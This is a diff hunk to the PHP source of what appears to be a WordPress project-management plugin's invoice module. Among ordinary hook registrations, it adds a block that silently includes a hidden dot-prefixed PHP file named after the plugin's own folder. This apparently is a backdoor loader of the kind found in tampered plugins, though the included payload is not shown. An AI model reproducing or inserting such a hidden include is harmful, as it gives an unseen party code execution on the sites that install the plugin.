@@ -37,6 +37,10 @@ add_action( 'pm_load_shortcode_script', 'register_invoice_scripts', 10 );
 add_action( 'pm_load_shortcode_script', 'pm_pro_invoice_scripts', 20 );
 
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_pro_admin_load_invoice_scripts() {
 	if (
 		isset( $_GET['page'] )
